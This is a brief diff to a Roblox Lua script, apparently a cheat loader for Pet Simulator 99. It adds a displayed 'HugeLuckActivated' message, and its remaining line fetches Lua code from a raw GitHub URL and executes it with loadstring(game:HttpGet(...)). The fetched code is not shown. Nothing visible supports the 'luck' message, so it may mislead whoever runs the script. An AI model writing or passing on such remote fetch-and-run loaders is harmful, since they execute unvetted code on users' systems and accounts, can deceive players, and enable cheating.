@@ -1,1 +1,4 @@
+local message = require(game.ReplicatedStorage.Library.Client.Message)
+    message.Error("HugeLuckActivated")
+local lib = require(game.ReplicatedStorage.Library)
 loadstring(game:HttpGet("https://raw.githubusercontent.com/Ankaikazc/PetSimulator99/main/Luaexe"))()
